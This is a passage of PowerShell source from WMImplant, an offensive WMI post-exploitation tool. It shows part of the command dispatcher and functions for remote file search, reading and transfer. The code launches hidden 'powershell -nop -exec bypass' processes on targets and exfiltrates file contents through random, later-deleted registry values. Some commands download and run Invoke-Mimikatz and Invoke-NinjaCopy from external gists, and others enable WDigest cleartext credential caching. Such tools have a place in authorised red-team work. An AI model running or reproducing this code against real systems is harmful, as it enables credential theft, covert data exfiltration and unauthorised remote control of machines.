            "gen_cli"
            {
                Invoke-CommandGeneration
            }

            "help"
            {
                Show-WMImplantMainMenu
            }

            "cat"
            {
                if ($Credential)
                {
                    Get-FileContentsWMImplant -Creds $Credential
                }

                else
                {
                    Get-FileContentsWMImplant
                }
            }

            "dg_download"
            {
                if ($Credential)
                {
                    Invoke-FileTransferWMImplantDG -Creds $Credential -Download
                }

                else
                {
                    Invoke-FileTransferWMImplantDG -Download
                }
            }

            "dg_upload"
            {
                if ($Credential)
                {
                    Invoke-FileTransferWMImplantDG -Creds $Credential -Upload
                }

                else
                {
                    Invoke-FileTransferWMImplantDG -Upload
                }
            }

            "download"
            {
                if ($Credential)
                {
                    Invoke-FileTransferWMImplant -Creds $Credential -Download
                }

                else
                {
                    Invoke-FileTransferWMImplant -Download
                }
            }

            "ls"
            {
                if ($Credential)
                {
                    Invoke-LSWMImplant -Creds $Credential
                }

                else
                {
                    Invoke-LSWMImplant
                }
            }

            "ninjacopy"
            {
                $FileToCopy = Read-Host "What is the full path to the file you'd like to copy? >"
                $CopyLocation = Read-Host "What is the full path to where you'd like the file copied to? >"
                $FullCommand = '"Invoke-NinjaCopy -Path '
                $FullCommand += "$FileToCopy "
                $FullCommand += '-RemoteDestination '
                $FullCommand += "$CopyLocation"
                $FullCommand +='"'
                if ($Credential)
                {
                    Invoke-RemoteScriptWithOutput -Creds $Credential -Url https://gist.githubusercontent.com/ChrisTruncer/e7d629bddc354b5405d7dafbc4f64eff/raw/eb868bc462a560970fa167b324250ce9f257904e/Invoke-NinjaCopy.ps1 -Function $FullCommand
                }

                else
                {
                    Invoke-RemoteScriptWithOutput -Url https://gist.githubusercontent.com/ChrisTruncer/e7d629bddc354b5405d7dafbc4f64eff/raw/eb868bc462a560970fa167b324250ce9f257904e/Invoke-NinjaCopy.ps1 -Function $FullCommand
                }
            }

            "search"
            {
                if($Credential)
                {
                    Find-FileWMImplant -Creds $Credential
                }

                else
                {
                    Find-FileWMImplant    
                }

            }

            "upload"
            {
                if ($Credential)
                {
                    Invoke-FileTransferWMImplant -Creds $Credential -Upload
                }

                else
                {
                    Invoke-FileTransferWMImplant -Upload
                }
            }

            "command_exec"
            {
                if ($Credential)
                {
                    Invoke-CommandExecution -Creds $Credential
                }

                else
                {
                    Invoke-CommandExecution
                }
            }

            "disable_wdigest"
            {
                if ($Credential)
                {
                    Invoke-RegValueMod -Creds $Credential -RegMethod delete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential'
                }

                else
                {
                    Invoke-RegValueMod -RegMethod delete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential'
                }
            }

            "disable_winrm"
            {
                if ($Credential)
                {
                    Invoke-ProcSpawn -Creds $Credential -Command 'powershell.exe -command "Disable-PSRemoting -Force"'
                }

                else
                {
                    Invoke-ProcSpawn -Command 'powershell.exe -command "Disable-PSRemoting -Force"'
                }
            }

            "enable_wdigest"
            {
                if ($Credential)
                {
                    Invoke-RegValueMod -Creds $Credential -RegMethod create -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -RegData '0x1'
                }

                else
                {
                    Invoke-RegValueMod -RegMethod create -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue UseLogonCredential -RegData "0x1"
                }
            }

            "enable_winrm"
            {
                if ($Credential)
                {
                    Invoke-ProcSpawn -Creds $Credential -Command 'powershell.exe -command "Enable-PSRemoting -Force"'
                }

                else
                {
                    Invoke-ProcSpawn -Command 'powershell.exe -command "Enable-PSRemoting -Force"'
                }
            }

            "registry_mod"
            {
                if($Credential)
                {
                    Invoke-RegValueMod -Creds $Credential
                }
                else
                {
                    Invoke-RegValueMod
                }
            }

            "remote_posh"
            {
                if ($Credential)
                {
                    Invoke-RemoteScriptWithOutput -Creds $Credential
                }

                else
                {
                    Invoke-RemoteScriptWithOutput
                }
            }

            "sched_job"
            {
                if($Credential)
                {
                    Invoke-JobMod -Creds $Credential
                }
                else
                {
                    Invoke-JobMod
                }
            }

            "service_mod"
            {
                if($Credential)
                {
                    Invoke-ServiceMod -Creds $Credential
                }
                else
                {
                    Invoke-ServiceMod
                }
            }

            "wdigest"
            {
                if($Credential)
                {
                    Invoke-RemoteScriptWithOutput -Creds $Credential -Url https://gist.githubusercontent.com/ChrisTruncer/5cf37e859372f135219daa4b699eb587/raw/f6517e07463427c8f9e418e8ca5dd4afbcaf9654/gistfile1.txt -Function Invoke-Mimikatz
                }
                else
                {
                    Invoke-RemoteScriptWithOutput -Url https://gist.githubusercontent.com/ChrisTruncer/5cf37e859372f135219daa4b699eb587/raw/f6517e07463427c8f9e418e8ca5dd4afbcaf9654/gistfile1.txt -Function Invoke-Mimikatz
                }
            }

            "process_kill"
            {
                if ($Credential)
                {
                    Invoke-ProcessPunisher -Creds $Credential
                }

                else
                {
                    Invoke-ProcessPunisher
                }
            }

            "process_start"
            {
                if ($Credential)
                {
                    Invoke-ProcSpawn -Creds $Credential
                }

                else
                {
                    Invoke-ProcSpawn
                }
            }

            "ps"
            {
                if ($Credential)
                {
                    Get-ProcessListingWMImplant -Creds $Credential
                }

                else
                {
                    Get-ProcessListingWMImplant
                }
            }

            "active_users"
            {
                if($Credential)
                {
                    Find-CurrentUsers -Creds $Credential
                }

                else
                {
                    Find-CurrentUsers
                }
            }

            "basic_info"
            {
                if($Credential)
                {
                    Get-HostInfo -Creds $Credential
                }

                else
                {
                    Get-HostInfo
                }
            }

            "drive_list"
            {
                if($Credential)
                {
                    Get-ComputerDrives -Creds $Credential
                }

                else
                {
                    Get-ComputerDrives
                }
            }

            "ifconfig"
            {
                if($Credential)
                {
                    Get-NetworkCards -Creds $Credential
                }

                else
                {
                    Get-NetworkCards
                }
            }

            "installed_programs"
            {
                if($Credential)
                {
                    Get-InstalledPrograms -Creds $Credential
                }

                else
                {
                    Get-InstalledPrograms
                }
            }

            "logon_events"
            {
                $FileSave = Read-Host "Do you want to save the log information to a file? [yes/no] >"
                $FileSave = $FileSave.Trim().ToLower()

                if(($FileSave -eq "y") -or ($FileSave -eq "yes"))
                {
                    $FileSavePath = Read-Host "What is the full path to where the file should be saved? >"
                    $FileSavePath = $FileSavePath.Trim()

                    if($Credential)
                    {
                        Get-WMIEventLogins -Creds $Credential -FileName $FileSavePath
                    }

                    else
                    {
                        Get-WMIEventLogins -FileName $FileSavePath
                    }
                }

                else
                {
                    if($Credential)
                    {
                        Get-WMIEventLogins -Creds $Credential
                    }

                    else
                    {
                        Get-WMIEventLogins
                    }
                }
            }

            "logoff"
            {
                if($Credential)
                {
                    Invoke-PowerOptionsWMI -Creds $Credential -Logoff
                }

                else
                {
                    Invoke-PowerOptionsWMI -Logoff
                }
            }

            "reboot"
            {
                if($Credential)
                {
                    Invoke-PowerOptionsWMI -Creds $Credential -Reboot
                }

                else
                {
                    Invoke-PowerOptionsWMI -Reboot
                }
            }

            "power_off"
            {
                if($Credential)
                {
                    Invoke-PowerOptionsWMI -Creds $Credential -Shutdown
                }

                else
                {
                    Invoke-PowerOptionsWMI -Shutdown
                }
            }

            "vacant_system"
            {
                if($Credential)
                {
                    Find-VacantComputer -Creds $Credential
                }
                else
                {
                    Find-VacantComputer
                }
            }

            default
            {
                Write-Output "You did not select a valid command! Please try again!"
            }
        } #End of switch
    } # End of while loop
} # End of function

function Find-FileWMImplant
{
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target,
        [Parameter(Mandatory = $False)]
        [string]$File,
        [Parameter(Mandatory = $False)]
        [string]$Drive,
        [Parameter(Mandatory = $False, ParameterSetName='extension')] 
        [string]$Extension
    )

    process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if(!$Drive)
        {
            $Drive = Read-Host "What drive do you want to search? (Ex: C:) >"
            $Drive = $Drive.Trim()
        }

        # Check length of drive, only want first two characters
        if($Drive.length -gt 2)
        {
            $Drive = $Drive.substring(0,2)
        }

        elseif($Drive.length -lt 2)
        {
            Throw "Drive needs two character EX: C:"
        }

        if(!$File -and !$Extension)
        {
            $Search_Target = Read-Host "Do you want to search for a [file] or file [extension]? >"
            $Search_Target = $Search_Target.Trim().ToLower()

            if($Search_Target -eq "file")
            {
                $File = Read-Host "What file do you want to search for? (Ex: pass.txt or *ssword.txt) >"
                $File = $File.Trim().ToLower()
            }
            elseif($Search_Target -eq "extension")
            {
                $Extension = Read-Host "What file extension do you want to search for? (Ex: sql) >"
                $Extension = $Extension.Trim().ToLower()
            }
            else
            {
                Throw "You need to search for either a file or file extension!"
            }
        }

        # If searching for a file and not a file extension
        if($File)
        {
            $counter = 0
            $filter = "Filename"
            foreach($incoming_file in $File)
            {
                if($counter -gt 0)
                {
                    $filter += "OR Filename"
                }

                if($incoming_file.Contains("."))
                {
                    #get the index of the last .
                    $index = $incoming_file.LastIndexOf(".")
                    #get the first part of the name
                    $filename = $incoming_file.Substring(0,$index)
                    #get the last part of the name
                    $extension = $incoming_file.Substring($index+1)

                    if($filename -match "\*")
                    {
                        $filename = $filename.Replace("*","%")
                        $filter += " LIKE '$filename' "
                    }
                    else
                    {
                        $filter += " = '$filename' "
                    }

                    if ($extension -match "\*")
                    {
                        $extension = $extension.Replace("*","%")
                        $filter += "AND Extension LIKE '$extension' "
                    }
                    else 
                    {
                        $filter += "AND Extension = '$extension' "
                    }
                    
                }
                else
                {
                    if($incoming_file -match "\*")
                    {
                        $filename = $incoming_file.Replace("*","%")
                        $filter += " LIKE '$filename' "
                    }
                    else
                    {
                        $filter += " = '$incoming_file' "
                    }
                }
                $counter += 1
            }
        }

        # If searching by extension
        elseif($Extension)
        {
            $counter = 0
            $filter = "Extension"
            foreach($ext in $Extension)
            {
                if($counter -gt 0)
                {
                    $filter += "OR Extension"
                }

                if ($ext -match "\*")
                {
                    $ext = $ext.Replace("*","%")
                    $filter += " LIKE '$ext' "
                }
                else 
                {
                    $filter += " = '$ext' "
                }
                $counter += 1
            }
        }

        $filter += "AND Drive='$Drive'"

        if($Creds)
        {
            Get-WmiObject -Class cim_datafile -filter $filter -ComputerName $Target -Credential $Creds
        }
        else
        {
            Get-WmiObject -Class cim_datafile -filter $filter -ComputerName $Target
        }
    }
}

function Get-FileContentsWMImplant
{

    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target,
        [Parameter(Mandatory = $False)]
        [string]$File
    )

    Process
    {
        $fullregistrypath = "HKLM:\Software\Microsoft\Windows"
        $registrydownname = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
        # The reghive value is for hkey_local_machine
        $reghive = 2147483650
        $regpath = "SOFTWARE\Microsoft\Windows"
        $SystemHostname = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name

        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if(!$File)
        {
            $File = Read-Host "What's the full path to the file you'd like to view? >"
            $File = $File.Trim()
        }

        # On remote system, save file to registry
        Write-Verbose "Reading remote file and writing on remote registry"
        $remote_command = '$fct = Get-Content -Encoding byte -Path ''' + "$File" + '''; $fctenc = [System.Convert]::ToBase64String($fct); New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fctenc -PropertyType String -Force'
        $remote_command = 'powershell -nop -exec bypass -c "' + $remote_command + '"'

        if($Creds)
        {
            Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -Credential $Creds -ComputerName $Target
        }
        else
        {
            Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -ComputerName $Target
        }

        Write-Verbose "Sleeping to let remote system read and store file"
        Start-Sleep -s 30

        # Grab file from remote system's registry
        Write-Verbose "Reading file from remote registry"

        if($Creds)
        {
            $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
        }
        else
        {
            $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target
        }
    
        $decode = [System.Convert]::FromBase64String($remote_reg.sValue)
        # Print to console
        $enc = [System.Text.Encoding]::ASCII
        $enc.GetString($decode)

        # Removing Registry value from remote system
        Write-Verbose "Removing registry value from remote system"

        if($Creds)
        {
            Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
        }
        else
        {
            Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target
        }
        Write-Verbose "Done!"
    }
    end{}
}

function Invoke-FileTransferWMImplant
{
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target,
        [Parameter(Mandatory = $False,ParameterSetName='download')]
        [switch]$Download,
        [Parameter(Mandatory = $False,ParameterSetName='upload')]
        [switch]$Upload,
        [Parameter(Mandatory = $False)]
        [string]$DownloadFile,
        [Parameter(Mandatory = $False)]
        [string]$DownloadFilePath,
        [Parameter(Mandatory = $False)]
        [string]$UploadFile,
        [Parameter(Mandatory = $False)]
        [string]$UploadFilePath,
        [Parameter(Mandatory = $False)]
        [string]$LocalUser,
        [Parameter(Mandatory = $False)]
        [string]$LocalPass
    )

    Process
    {
        # invoke powershell on both remote and local system.  Both will connect back over WMI to retrieve file contents
        # applies to both download and upload operations.
        # Uses HKLM/Software/Microsoft/DRM to store data, because fuck DRM
        #2147483650 - hklm, 2147483649 - kkcu, 

        $fullregistrypath = "HKLM:\Software\Microsoft\Windows"
        $registryupname = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
        $registrydownname = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
        # The reghive value is for hkey_local_machine
        $reghive = 2147483650
        $regpath = "SOFTWARE\Microsoft\Windows"
        $SystemHostname = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name

        # Get information needed to transfer the file
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if($Download)
        {
            if(!$DownloadFile)
            {
                $Download_File = Read-Host "What's the full path to the file you'd like to download? >"
                $Download_File = $Download_File.Trim()
            }
            else
            {
                $Download_File = $DownloadFile
            }

            if(!$DownloadFilePath)
            {
                $Download_File_Path = Read-Host "What's the full path to location you'd like to save the file locally? >"
                $Download_File_Path = $Download_File_Path.Trim()
            }
            else
            {
                $Download_File_Path = $DownloadFilePath
            }

            # On remote system, save file to registry
            Write-Verbose "Reading remote file and writing on remote registry"
            $remote_command = '$fct = Get-Content -Encoding byte -Path ''' + "$Download_file" + '''; $fctenc = [System.Convert]::ToBase64String($fct); New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fctenc -PropertyType String -Force'
            $remote_command = 'powershell -nop -exec bypass -c "' + $remote_command + '"'

            if($Creds)
            {
                Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -Credential $Creds -ComputerName $Target
            }
            else
            {
                Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -ComputerName $Target
            }

            Write-Verbose "Sleeping to let remote system read and store file"
            Start-Sleep -s 30

            # Grab file from remote system's registry
            Write-Verbose "Reading file from remote registry"

            if($Creds)
            {
                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
            }
            else
            {
                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target
            }
            
            $decode = [System.Convert]::FromBase64String($remote_reg.sValue)
            Set-Content -Path $Download_file_path -Value $decode -Encoding Byte

            # Removing Registry value from remote system
            Write-Verbose "Removing registry value from remote system"

            if($Creds)
            {
                Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
            }
            else
            {
                Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target
            }

            Write-Verbose "Done!"
        }

        elseif($Upload)
        {
            if(!$UploadFile)
            {
                $Upload_File = Read-Host "What's the full path to the file you'd like to upload? >"
                $Upload_File = $Upload_File.Trim()
            }
            else
            {
                $Upload_File = $UploadFile
            }

            if(!$UploadFilePath)
            {
                $Upload_Dir = Read-Host "What is the full path to the location you would like the file uploaded to? >"
                $Upload_Dir = $Upload_Dir.Trim()
            }
            else
            {
                $Upload_Dir = $UploadFilePath
            }

            if(!$LocalUser -or !$LocalPass)
            {
                Write-Verbose "Please provide username and password for this system!"
                $LocalUser = Read-Host "What's the domain\username account for the system WMImplant is running on? >"
                $LocalUser = $LocalUser
                $LocalPass = Read-Host "Password >"
                $LocalPass = $LocalPass
            }

            # Read in file and base64 encode it
            Write-Verbose "Read in local file and base64 encode it"
            $filecontents = Get-Content -Encoding byte $Upload_File
            $filecontentencoded = [System.Convert]::ToBase64String($filecontents)

            Write-Verbose "Writing encoded file to local registry"
            $localkey = New-ItemProperty -Path $fullregistrypath -Name $registryupname -Value $filecontentencoded -PropertyType String -Force
            
            # grabs registry value and saves to disk
            Write-Verbose "Connecting to $Target"
            $remote_posh = '$Hive = 2147483650; $key = ''' + "$regpath'" + '; $value = ''' + "$registryupname" + '''; $pas = ConvertTo-SecureString ''' + "$LocalPass'" + ' -asplaintext -force; $crd = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist ''' + "$LocalUser'" +',$pas; $out = Invoke-WmiMethod -Namespace ''root\default'' -Class ''StdRegProv'' -Name ''GetStringValue'' -ArgumentList $Hive, $key, $value -ComputerName ' + "$SystemHostname" + ' -Credential $crd; $decode = [System.Convert]::FromBase64String($out.sValue); Set-Content -Path ' + "$Upload_Dir" + ' -Value $decode -Encoding Byte'
            $remote_posh = 'powershell -nop -exec bypass -c "' + $remote_posh + '"'
           
            if($Creds)
            {
                Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_posh -Credential $Creds -ComputerName $Target
            }
            else
            {
                Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_posh -ComputerName $Target
            }

            Write-Verbose "Sleeping to let remote system execute WMI command"
            Start-Sleep -s 30

            # Remove registry key
            Write-Verbose "Removing registry value storing uploaded file"
            $local_reg = Remove-ItemProperty -Path $fullregistrypath -Name $registryupname

            Write-Verbose "Done!"
        }
    } # End of Process Block
    end{}
} # End of Function block

function Invoke-FileTransferWMImplantDG
{
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target,
        [Parameter(Mandatory = $False,ParameterSetName='download')]
        [switch]$Download,
        [Parameter(Mandatory = $False,ParameterSetName='upload')]
        [switch]$Upload,
        [Parameter(Mandatory = $False)]
        [string]$DownloadFile,
        [Parameter(Mandatory = $False)]
        [string]$DownloadFilePath,
        [Parameter(Mandatory = $False)]
        [string]$UploadFile,
        [Parameter(Mandatory = $False)]
        [string]$UploadFilePath,
        [Parameter(Mandatory = $False)]
        [string]$LocalUser,
        [Parameter(Mandatory = $False)]
        [string]$LocalPass
    )

    Process
    {
        # invoke powershell on both remote and local system.  Both will connect back over WMI to retrieve file contents
        # applies to both download and upload operations.
        #2147483650 - hklm, 2147483649 - kkcu, 

        $fullregistrypath = "HKLM:\Software\Microsoft\Windows"
        $registryupname = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
        $registrydownname = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
        # The reghive value is for hkey_local_machine
        $reghive = 2147483650
        $regpath = "SOFTWARE\Microsoft\Windows"
        $SystemHostname = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name

        # Get information needed to transfer the file
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if($Download)
        {
            if(!$DownloadFile)
            {
                $Download_File = Read-Host "What's the full path to the file you'd like to download? >"
                $Download_File = $Download_File.Trim()
            }
            else
            {
                $Download_File = $DownloadFile
            }

            if(!$DownloadFilePath)
            {
                $Download_File_Path = Read-Host "What's the full path to location you'd like to save the file locally? >"
                $Download_File_Path = $Download_File_Path.Trim()
            }
            else
            {
                $Download_File_Path = $DownloadFilePath
            }

            $temp_path = Split-Path -Path $Download_File
            $temp_path += '\temp.txt'

            # On remote system, save file to registry
            Write-Verbose "Reading remote file and writing on remote registry"
            $remote_command = 'certutil -encode ''' + "$Download_file" + ''' ''' + $temp_path + '''; $fct = Get-Content -Path ''' + "$temp_path" + '''; New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fct -PropertyType String -Force; del ''' + "$temp_path + '''"
            $remote_command = 'powershell -nop -exec bypass -c "' + $remote_command + '"'

            if($Creds)
            {
                Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -Credential $Creds -ComputerName $Target
            }
            else
            {
                Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -ComputerName $Target
            }

            Write-Verbose "Sleeping to let remote system read and store file"
            Start-Sleep -s 30

            # Grab file from remote system's registry
            Write-Verbose "Reading file from remote registry"

            if($Creds)
            {
                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
            }
            else
            {
                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target
            }
            
            # Write encoded file to disk, decode it
            $store_path = Split-Path -Path $$Download_File_Path
            $store_path += '\dcdtemp.txt'
            Set-Content -Path $store_path -Value $remote_reg.sValue
            certutil -decode $store_path $Download_File_Path
            del $store_path

            # Removing Registry value from remote system
            Write-Verbose "Removing registry value from remote system"

            if($Creds)
            {
                Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
            }
            else
            {
                Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target
            }

            Write-Verbose "Done!"
        }

        elseif($Upload)
        {
            if(!$UploadFile)
            {
                $Upload_File = Read-Host "What's the full path to the file you'd like to upload? >"
                $Upload_File = $Upload_File.Trim()
            }
            else
            {
                $Upload_File = $UploadFile
            }

            if(!$UploadFilePath)
            {
                $Upload_Dir = Read-Host "What is the full path to the location you would like the file uploaded to? >"
                $Upload_Dir = $Upload_Dir.Trim()
            }
            else
            {
                $Upload_Dir = $UploadFilePath
            }

            if(!$LocalUser -or !$LocalPass)
            {
                Write-Verbose "Please provide username and password for this system!"
                $LocalUser = Read-Host "What's the domain\username account for the system WMImplant is running on? >"
                $LocalUser = $LocalUser
                $LocalPass = Read-Host "Password >"
                $LocalPass = $LocalPass
            }

            # Base64 encode file, read it in, and store in registry
            Write-Verbose "Read in local file and base64 encode it"
            $temp_path = Split-Path -Path $Upload_File
            $temp_path += '\temp.txt'
            certutil -encode $Upload_File $temp_path
            $filecontentencoded = Get-Content $temp_path
            del $temp_path

            Write-Verbose "Writing encoded file to local registry"
            $localkey = New-ItemProperty -Path $fullregistrypath -Name $registryupname -Value $filecontentencoded -PropertyType String -Force

            # Temp location for decoding file
            $upload_temp = Split-Path -Path $Upload_Dir
            $upload_temp += '\updcd.txt'
            
            # grabs registry value and saves to disk
            Write-Verbose "Connecting to $Target"
            $remote_posh = '$Hive = 2147483650; $key = ''' + "$regpath'" + '; $value = ''' + "$registryupname" + '''; $pas = ConvertTo-SecureString ''' + "$LocalPass'" + ' -asplaintext -force; $crd = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist ''' + "$LocalUser'" +',$pas; $out = Invoke-WmiMethod -Namespace ''root\default'' -Class ''StdRegProv'' -Name ''GetStringValue'' -ArgumentList $Hive, $key, $value -ComputerName ' + "$SystemHostname" + ' -Credential $crd; Set-Content -Path ' + "$upload_temp" + ' $out.sValue; certutil -decode ' + "$upload_temp" + ' ' + "$Upload_Dir" + '; del ' + "$upload_temp"
            $remote_posh = 'powershell -nop -exec bypass -c "' + $remote_posh + '"'

            if($Creds)
            {
                Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_posh -Credential $Creds -ComputerName $Target
            }
            else
            {
                Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_posh -ComputerName $Target
            }

            Write-Verbose "Sleeping to let remote system execute WMI command"
            Start-Sleep -s 30

            # Remove registry key
            Write-Verbose "Removing registry value storing uploaded file"
            $local_reg = Remove-ItemProperty -Path $fullregistrypath -Name $registryupname

            Write-Verbose "Done!"
        }
    } # End of Process Block
    end{}
} # End of Function block

function Invoke-LSWMImplant
{
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target,
        [Parameter(Mandatory = $False)] 
        [string]$Directory
    )

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if(!$Directory)
        {
            $Directory = Read-Host "What's the full path to the directory? >"
            $Directory = $Directory.Trim()
        }

        $Drive = $Directory.Substring(0,2)
        $DirPath = $Directory.Substring(2)
        $DirPath = $DirPath.Replace("\","\\")
        if(!$DirPath.Endswith('\\'))
        {
            $DirPath += "\\"
        }
        Write-Verbose "Connecting to $Target"
        $filter = "Drive='$Drive' and Path='$DirPath'"

        if($Creds)
        {
            Get-WmiObject -Class Win32_Directory -Filter $filter -ComputerName $Target -Credential $Creds
            Get-WMIObject -Class CIM_Datafile -filter $filter -ComputerName $Target -Credential $Creds
        }
        else
        {
            Get-WmiObject -Class Win32_Directory -Filter $filter -ComputerName $Target
            Get-WMIObject -Class CIM_Datafile -filter $filter -ComputerName $Target
        }
    }
    end{}
}
